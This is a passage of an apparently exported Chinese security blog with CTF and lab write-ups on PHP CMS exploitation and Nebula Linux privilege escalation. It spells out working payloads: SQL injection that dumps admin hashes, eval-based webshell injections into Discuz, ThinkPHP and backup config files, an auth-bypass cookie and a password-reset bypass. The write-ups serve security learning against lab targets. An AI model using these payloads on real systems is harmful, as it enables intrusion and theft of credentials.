if(strpos($s,$val) !==false){\n            die('很抱歉，执行出错，发现危险字符【'.$val.'】');\n        }\n    }\n    if(preg_match(\"/^[a-z]$/i\")){\n        die('很抱歉，执行出错，发现危险字符');\n    }\n    return $s;\n}\nfunction parserIfLabel( $content ) {\n    $pattern = '/\\{if:([\\s\\S]+?)}([\\s\\S]*?){end\\s+if}/';\n    if ( preg_match_all( $pattern, $content, $matches ) ) {\n        $count = count( $matches[ 0 ] );\n        for ( $i = 0; $i < $count; $i++ ) {\n            $flag = '';\n            $out_html = '';\n            $ifstr = $matches[ 1 ][ $i ];\n            $ifstr=danger_key($ifstr,1);\n            if(strpos($ifstr,'=') !== false){\n                $arr= splits($ifstr,'=');\n                if($arr[0]=='' || $arr[1]==''){\n                    die('很抱歉，模板中有错误的判断,请修正【'.$ifstr.'】');\n                }\n                $ifstr = str_replace( '=', '==', $ifstr );\n            }\n            $ifstr = str_replace( '<>', '!=', $ifstr );\n            $ifstr = str_replace( 'or', '||', $ifstr );\n            $ifstr = str_replace( 'and', '&&', $ifstr );\n            $ifstr = str_replace( 'mod', '%', $ifstr );\n            $ifstr = str_replace( 'not', '!', $ifstr );\n            if ( preg_match( '/\\{|}/', $ifstr)) {\n                die('很抱歉，模板中有错误的判断,请修正'.$ifstr);\n            }else{\n                @eval( 'if(' . $ifstr . '){$flag=\"if\";}else{$flag=\"else\";}' );\n            }\n\n            if ( preg_match( '/([\\s\\S]*)?\\{else\\}([\\s\\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) {\n                switch ( $flag ) {\n                    case 'if':\n                        if ( isset( $matches2[ 1 ] ) ) {\n                            $out_html .= $matches2[ 1 ];\n                        }\n                        break;\n                    case 'else':\n                        if ( isset( $matches2[ 2 ] ) ) {\n                            $out_html .= $matches2[ 2 ];\n                        }\n                        break;\n                }\n            } elseif ( $flag == 'if' ) {\n                $out_html .= $matches[ 2 ][ $i ];\n            }\n            $pattern2 = '/\\{if([0-9]):/';\n            if ( preg_match( $pattern2, $out_html, $matches3 ) ) {\n                $out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html );\n                $out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html );\n                $out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html );\n                $out_html = $this->parserIfLabel( $out_html );\n            }\n            $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content );\n        }\n    }\n    return $content;\n}\nfunction splits( $s, $str=',' ) {\n    if ( empty( $s ) ) return array( '' );\n    if ( strpos( $s, $str ) !== false ) {\n        return explode( $str, $s );\n    } else {\n        return array( $s );\n    }\n}\n```\n\nzzzcms的模改，[参考](https://my.oschina.net/u/3076320/blog/4345639)\n\nparserIfLabel函数应该就是它的魔改，但用原来的payload肯定不行，文件包含函数和命令执行函数过滤了很多，所以我们在{if:assert($_request[phpinfo()])}phpinfo();{end if}的基础上改一下\n\n```\n{if:assert($_request[phpinfo()])}phpinfo();{end if} 失败\n{if:assert(phpinfo())}phpinfo();{end if} 失败\n{if:phpinfo(123)}phpinfo();{end if}失败\n{if:(phpinfo(123))}{end if}失败\n{if:(phpinfo)(123)}{end if} 失败\n{if:(system)('ls')}{end if} 失败\n```\n\n但题中源码是遍历数组元素过滤，我们拼接一下函数不就可以绕过了吗，所以\n\n```\n{if:('sys'.'tem')('ls')}{end if}\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112630.png)\n\n那么直接读取根目录文件，读取根目录flag即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112709.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824112722.png)\n\n### littlegame\n\n直接看路由里的index.js，可以看到得到flag的条件如果是\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113109.png)\n\n就会直接往服务端发送flag，来看下admin\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113137.png)\n\n获得的是环境变量中传入的值，接着往下看有几个方法\n\nSpawnPoint方法向服务端发送开始指令\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113159.png)\n\nPrivilage方法接受NewAttributeKey和NewAttributeValue，假如为空则重定向，不为空则传入key和value并将他们传到session中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163829.png)\n\n再看wp的时候学到了一招，在给了package.json的情况下可以直接运行npm audit命令查看存在的漏洞\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824163527.png)\n\n这里就直接说明了是set-value造成的原型链污染，[参考](https://snyk.io/vuln/SNYK-JS-SETVALUE-450213)\n\n实践一下，首先开始\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113222.png)\n\n创建key和value\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113244.png)\n\n检查\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113256.png)\n\n### easytrick\n\n```php\n<?php\nclass trick{\n    public $trick1;\n    public $trick2;\n    public function __destruct(){\n        $this->trick1 = (string)$this->trick1;\n        if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){\n            die(\"你太长了\");\n        }\n        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){\n            echo file_get_contents(\"/flag\");\n        }\n    }\n}\nhighlight_file(__FILE__);\nunserialize($_GET['trick']);\n```\n\n要求传序列化字符串，传进去之后强制类型转换，数组绕过强碰撞没了，传入的元素长度必须在5以下，那么一些已知的相同MD5的字符串也没了，如果类型不等，值不等，他们的md5相等，就给flag\n\nphp的一个小trick\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113342.png)\n\n即如果小数点后面超过14位php就会四舍五入\n\n这样的话我们构造trick1=2，trick2=2.00000000000000112，序列化之后md5的值就都是2了满足了两个md5强相等\n\n而其他两个条件也满足\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113358.png)\n\n全部满足，所以构造\n\n```\nO:5:\"trick\":2:{s:6:\"trick1\";i:2;s:6:\"trick2\";d: 2.00000000000000112;}\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113435.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113451.png)\n\n看wp还有一种payload，利用的是NAN和INF的性质，他们分别代表非数字和无穷大，与任何数据类型（除了true）做强类型或弱类型比较均为false，[参考](https://blog.csdn.net/weixin_43257005/article/details/106118623)\n\n```php\n<?php\nclass trick{\n    public $trick1;\n    public $trick2;\n}\n$tr = new trick();\n$tr->trick1 = NAN;\n$tr->trick2 = NAN;\necho serialize($tr);\n//O:5:\"trick\":2:{s:6:\"trick1\";d:NAN;s:6:\"trick2\";d:NAN;}\n```\n\n或者\n\n```php\n<?php\nclass trick{\n    public $trick1;\n    public $trick2;\n}\n$tr = new trick();\n$tr->trick1 = INF;\n$tr->trick2 = INF;\necho serialize($tr);\n```","tags":["RCE","serialize","js原型链污染"],"categories":["CTF"]},{"title":"i春秋刷题——cms实验","url":"/2020/08/17/ichunqiu_cms/","content":"\n平台：ichunqiu.com\n\n### 渗透测试笔记\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080504.png)\n\n目标网站是一个齐博cms，先扫一波目录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815080743.png)\n\n没找到有啥默认用户名和密码，但输入admin提示的是密码错误，但输其他的会显示用户错误，尝试对admin爆破即可。失败\n\n注册个普通账号，啥都点一下，想起来以前好像做过齐博cms更新资料有个报错注入，百度了一下，可能版本不一样这里没userinfo，pass。\n\n但还是找到一个整站注入：https://www.seebug.org/vuldb/ssvid-94157\n\n直接爆了管理员账号密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815090816.png)\n\n但这里密码hash没显示完全，改一下payload\n\n```\nindex.php?jobs=show&label_hf[1' and extractvalue(1,concat(0x5c,(select concat(username,password) from qb_members limit 1)))%23][2]=asd\nindex.php?jobs=show&label_hf[1' and extractvalue(1,concat(0x5c,(select substr(password,20,30) from qb_members limit 1)))%23][2]=asd\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815093735.png)\n\n跟之前的拼接一下得到密码hash：b10a9a82cf828627be682033e6c5878c，解密网站解得：whoami!@#123\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094014.png)\n\n登陆后台\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815094128.png)\n\n百度到了一个后台Getshell，https://xz.aliyun.com/t/2248，试一下\n\n增加栏目为`${assert($_POST[a])}`，再菜刀连接/data/guide_fid.php，出错，失败\n\n再试下这个：https://www.uedbox.com/post/41188/\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101357.png)\n\n点击生成静态\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101506.png)\n\n成功getshell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101547.png)\n\n找到flag文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101736.png)\n\n第三题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815101813.png)\n\n打开网站是个discuz论坛\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815103608.png)\n\n没看清题目还以为这是两个服务器的站。。。那么直接在刚刚获得的shell里操作\n\n找下论坛的数据库文件，没找到，瞄一下wp，在dedecms.bak的data文件夹里（问号）\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104142.png)\n\n在菜刀的数据库管理填下信息登上去\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815104906.png)\n\n然后就是翻salt值，查看所有包含salt字段值的列\n\n`select * from information_schema.columns where column_name = 'salt'`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110204.png)\n\n到相应位置读取值，这里有两个，看下用户名分别对应哪个即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200815110253.png)\n\n\n\n### 这不是DZ漏洞？\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083258.png)\n\n打开网站是dz论坛，在网站底部看到是dz3.1\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083412.png)\n\n百度下相关漏洞，找到了x3.1的插件/utility/convert/index.php存在代码执行漏洞\n\n试下，页面没被删除\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816085638.png)\n\npayload：`a=config&source=d7.2_x2.0&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&submit=yes`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091511.png)\n\n用菜刀连接`/utility/convert/data/config.inc.php`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091538.png)\n\n拿到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091659.png)\n\n### reinstall\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816130535.png)\n\n扫一遍没发现啥，看题目是reinstall想到可能是有Install文件没删，install请求无果但是install.php.bak成功\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132708.png)\n\n啥都不知道肯定安装不成功，但出错的时候把配置文件路径爆出来了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132830.png)\n\n访问几个目录啥都没有，百度到了一个[Mao10CMS前台Getshell](http://www.hackdig.com/02/hack-18952.htm)，提到了Application/Common/Conf/db.php 也就是这个环境中爆出来的配置文件安装没有做任何过滤，直接就是安装了\n\n```\nif($_POST['db_host'] && $_POST['db_name'] && $_POST['db_user'] && $_POST['db_prefix'])\n{ $file = \"Application/Common/Conf/db.php\";\n$data = \" 'mysql', // 数据库类型\n'DB_HOST' => '\".$_POST['db_host'].\"', // 服务器地址\n'DB_NAME' => '\".$_POST['db_name'].\"', // 数据库名\n'DB_USER' => '\".$_POST['db_user'].\"', // 用户名\n'DB_PWD' => '\".$_POST['db_pwd'].\"', // 密码\n'DB_PORT' => 3306, // 端口\n'DB_PREFIX' => '\".$_POST['db_prefix'].\"', // 数据库表前缀\n'DB_CHARSET' => 'utf8', //数据库编码\n'ADMIN_LOGIN' => '\".$_POST['admin_login'].\"', //创始人账号\n'ADMIN_PASS' => '\".$_POST['admin_pass'].\"', //创始人密码\n); ?>\";\n$db_info = file_put_contents ($file, $data);\nif($db_info) { $callback = 1; } else { $callback = 2; };\n$con = mysql_connect($_POST['db_host'],$_POST['db_user'],$_POST['db_pwd']);\nmysql_query(\"CREATE DATABASE \".$_POST['db_name'],$con);\nif (!$con) { $callback = 2; }; } else { $callback = 0; } ?>\n```\n\ndb_host，db_user，db_name,db_pwd会写入数据库，但db_prefix会写入配置文件，写入一句话木马即可getshell\n\n实践一下，按照文章里的方式构造一句话木马\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134450.png)\n\n`',`把前面闭合，`,//`把后面注释\n\n提交再用菜刀连接，成功getshell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134647.png)\n\n在html文件夹里找到flag\n\n### 框架漏洞\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204108.png)\n\n登录失败的时候爆出了是一个叫shuguang的cms\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204203.png)\n\n百度了一下这个cms基于Thinkphp开发，尝试让框架报错爆出来是tp2.1\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204720.png)\n\n2.1可执行任意系统命令，直接搜payload了，\n\n`index.php/Index/index/name/$%7B@phpinfo%28%29%7D`输出phpinfo()信息\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817204919.png)\n\n`http://www.test.ichunqiu/index.php/module/action/param1/${@print(eval($_POST[c]))}`菜刀直接连接\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817205810.png)\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817205845.png)\n\n### 越权访问\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817212259.png)\n\n搜下webftp，了解到相当于一个WEB文件共享程序，也就是网盘。\n\n抓个包爆破出了弱密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817213902.png)‘\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817214510.png)\n\n但无论是上传文件，创建文件还是创建目录都没有权限，然后扫目录发现还有个bak目录，是帝国备份王后台\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817223252.png)\n\n百度下相关信息，了解到存在万能cookie从而造成[任意登录](https://www.cnblogs.com/LittleHann/p/4519968.html)，并且可以getshell\n\n使用文章中的万能cookie访问admin.php\n\n```\nebak_loginebakckpass:119770adb578053dcb383f67a81bcbc6 \nebak_bakrnd:35y5cCnnA4Kh \nebak_bakusername:admin \nebak_baklogintime:4070883661\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224428.png)\n\n继续按照文章中的方法getshell\n\n备份数据到safemod\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224821.png)\n\n到管理备份目录打包下载，这里备份后的safemod目录下所有的表都是以PHP保存的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817224926.png)\n\n本来可以下载看到备份文件的内容，但ichunqiu的内网靶机看不了，就直接看文章中的吧\n\n例如它的文件格式会是：\n\n```\n<?php\n    $b_table=\"ecs_ad_custom\";\n    $tb[ecs_ad_custom]=1;\n\n    $b_baktype=0;\n    $b_filesize=300;\n    $b_bakline=500;\n    $b_autoauf=1;\n    $b_dbname=\"test\";\n    $b_stru=1;\n    $b_strufour=0;\n    $b_dbchar=\"auto\";\n    $b_beover=0;\n    $b_insertf=\"replace\";\n    $b_autofield=\",,\";\n    $b_bakdatatype=0;\n    ?>\n```\n\n将字符: `$b_bakdatatype=0;`替换为: `$b_bakdatatype=0;eval($_POST['a']);`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225448.png)\n\n再用菜刀连接bdata/safemod/config.php，成功getshell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225623.png)\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200817225748.png)\n\n### 信息泄露\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818135541.png)\n\nJoomla，扫个目录，有后台还有phpmyadmin页面，但后台登录就500，只有尝试爆破phpmyadmin，无果\n\n然后瞄wp，说是原题有个提示，可以下载到网站的源码，目录下有个configuration.php文件，直接请求下吧\n\nconfiguration.php空白，加个~泄露出了文件信息\n\n```\n<?php\nclass JConfig {\n\tpublic $offline = '0';\n\tpublic $offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';\n\tpublic $display_offline_message = '1';\n\tpublic $offline_image = '';\n\tpublic $sitename = 'web2';\n\tpublic $editor = 'tinymce';\n\tpublic $captcha = '0';\n\tpublic $list_limit = '20';\n\tpublic $access = '1';\n\tpublic $debug = '0';\n\tpublic $debug_lang = '0';\n\tpublic $dbtype = 'mysqli';\n\tpublic $host = 'localhost';\n\tpublic $user = 'root';\n\tpublic $password = '9550bef955f9';\n\tpublic $db = 'web';\n\tpublic $dbprefix = 'm9w42_';\n...\n```\n\n可以看到直接给了mysql的数据库，用户名，密码等信息，这样就可以登录phpmyadmin了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818145408.png)\n\n在web中找到joomla管理员后台的密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818150007.png)\n\n但可能环境有问题还是500登不上去，pass吧，看了下wp后面是登录进去之后可以编辑模板插入一句话木马，提交之后根据标题提示，用菜刀连接`template/atomic/index.php`即可getshell\n\n### 代码执行\n\n又是个discuz\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818152548.png)\n\n依旧扫后台，爆破走一套\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818152745.png)\n\n其他没啥，robots.txt爆出了一些文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818153246.png)\n\n待续。。。\n\n### session欺骗\n\n首页底部得知是zzcms并且后台管理入口就在底部\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818184938.png)\n\n密码不知道，扫一波目录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818185512.png)\n\n并且这些目录都是有查看权限的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818185637.png)\n\n百度到了一个[任意用户密码修改漏洞](https://www.seebug.org/vuldb/ssvid-97130)，试下\n\n首先抓包/admin/ZC_Password请求，改成post请求，再在body处加上payload：`name=admin&newpass=123333&newpass1=123333&&submit=%E7%99%BB+%E5%BD%95`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190340.png)\n\n发包，成功登录后台\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190452.png)\n\n左侧找到添加下载，可以上传一句话木马，并直接返回了路径\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818190854.png)\n\n那么直接上菜刀，getshell，flag在html目录下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200818191055.png)\n\n","categories":["ichunqiu综合渗透练习"]},{"title":"i春秋刷题——Exploit-Exercises:Nebula","url":"/2020/08/12/ichunqiu_attackpractice/","content":"\n平台：https://www.ichunqiu.com/\n\n### level00\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811112301.png)\n\n靶机地址，用户名和密码xshell登录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811112557.png)\n\n首先找特权程序，特权程序即set-uid(SUID)，它是控制文件访问的权限标志，允许用户以可执行文件的 owner 或 owner group 的权限运行可执行文件，当 s 出现在文件拥有者的 x 权限上时，就被称为 SETUID BITS 或 SETUID（[Linux 特殊权限 SUID,SGID,SBIT](https://www.cnblogs.com/sparkdev/p/9651622.html)）\n\n使用命令：`find / -perm -4000 2> /dev/null | xrags ls -lh`，忽略错误信息输出所有拥有SUID权限的文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811122631.png)\n\n进入第一个文件路径下执行flag00提权，拿到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811130506.png)\n\n### level01\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811130710.png)\n\n执行flag文件并追踪命令执行过程\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811132017.png)\n\n可以看到调用了system命令，但这里的echo是通过env定位找到的，如果我们让env优先定位到我们伪造的echo，再将echo执行的是我们想要的东西，就能getflag\n\n首先添加环境变量\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811133437.png)\n\n执行`ln -s /bin/getflag /home/level01/echo`，创建一个链接到了getflag的echo\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811133834.png)\n\n这样，在执行./flag之后，env寻找echo时会先找到/home/level01处的echo，而此处的echo执行的是/bin/getflag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811134251.png)\n\n确认行的通之后创建一个新的echo内容为`cat /home/flag01/flag`，回到./flag01目录执行即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811135956.png)\n\nps：这里的echo要给权限\n\n### level02\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144418.png)\n\n执行flag02\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144348.png)\n\n查看调用过程可以看到是获取了环境变量的user\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144835.png)\n\n直接修改环境变量中的USER使得读取flag文件即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145118.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145145.png)\n\n### level03\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145817.png)\n\nflag文件夹里有个脚本\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145753.png)\n\n会执行writable.d中的脚本并删除，那么我们在writeable.d中创建一个文件，写上我们的命令即可，别忘了赋权限\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811154044.png)\n\n### level04\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811155801.png)\n\nflag目录下有个token文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160003.png)\n\nflag04可以直接读文件，但token读不了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160631.png)\n\n看下执行过程\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160720.png)\n\n有一个strstr函数，禁止我们读的文件名中有token字符串，那我们可以创建一个软链接指向token，间接的读取token\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811161555.png)\n\n然后用token作为密码登录flag04用户即可getflag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811161725.png)\n\n### level05\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812091110.png)\n\n进入flag文件只有一个flag但有挺多隐藏文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812091507.png)\n\nbackup目录里有个tgz包，权限不足解压到tmp目录下，直接给了私钥\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812092012.png)\n\n那么直接私钥登录flag05就行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812092358.png)\n\n### level06\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812093638.png)\n\n提示我们破解登陆密码，看下passwd文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812094039.png)\n\n直接用john爆破，得到密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812095058.png)\n\n登录获取flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812095242.png)\n\n### level07\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100624.png)\n\n在7007端口开了http服务\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100517.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812100606.png)\n\n命令注入\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101654.png)\n\n读取flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101733.png)\n\n### level08\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812101927.png)\n\n有个流量包\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812102549.png)\n\n用wireshark打开，看到登录信息，但密码后面还有点东西\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812103026.png)\n\nhex查看，是7f和0d\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812103251.png)\n\n对照不可见字符表得知7f是删除键，0d是CR键，也就是回车\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812104223.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812104255.png)\n\n那么密码就是backdoor退格退格退格00Rm8退格ate回车，也就是backd00Rmate\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812105450.png)\n\n### level09\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812111959.png)\n\n有个php文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812111921.png)\n\n```php\n<?php\n\nfunction spam($email)\n{\n\t$email = preg_replace(\"/\\./\", \" dot \", $email);\n\t$email = preg_replace(\"/@/\", \" AT \", $email);\n\t\n\treturn $email;\n}\n\nfunction markup($filename, $use_me)\n{\n\t$contents = file_get_contents($filename);\n\n\t$contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents);\n\t$contents = preg_replace(\"/\\[/\", \"<\", $contents);\n\t$contents = preg_replace(\"/\\]/\", \">\", $contents);\n\n\treturn $contents;\n}\n\n$output = markup($argv[1], $argv[2]);\n\nprint $output;\n```\n\nphp代码用正则进行了一系列替换，并且flag09直接输出php处理后的结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812113149.png)\n\n但这里`$contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents);`用到了/e模式，如果启用该模式，那么preg_replace可以造成代码执行。\n\n如果我们构造`[email {${phpinfo()}}]`，由于在PHP中双引号包裹的字符串中可以解析变量， `${phpinfo()} `中的 phpinfo() 会被当做变量先执行，执行后，即变成 `${1} (phpinfo())`成功执行返回true。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812132108.png)\n\n那么[email {${\\`cat flag\\`}}]读取flag即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812131711.png)\n\n### level10\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813131426.png)\n\n了解一下TOCTOU。【参考：[Windows 0day任意文件读取漏洞POC分析](http://13.58.107.157/archives/6124)】\n\nTOCTOU是Time of Check Versus Time of Use的缩写，即文件访问竞态条件漏洞，该漏洞主要原理为应用运行的过程中，在某个操作之前，比如读文件，都会检查一下文件是否存在与是否具有权限，在检查与真正的读取之间的间隔就是一个可以被利用的竞争条件（Race Condition），在这个间隔中我们可以将需要越权读取的文件替换成自己的文件，使其检查过程通过，这样就可以越权读取其他用户的文件。\n\nflag文件夹下有token，可执行的flag10和flag，flag和token没权限访问，但flag10可以发送文件到主机，看下它的调用过程\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200813141647.png)\n\n用到了一个access函数，access函数判断当前用户是否有操作文件的权限（uid判断），如果当前用户没有针对该文件的权限，则打印ERROR，有则open。但这里存在一个问题，引用wp中作者原话\n\n> 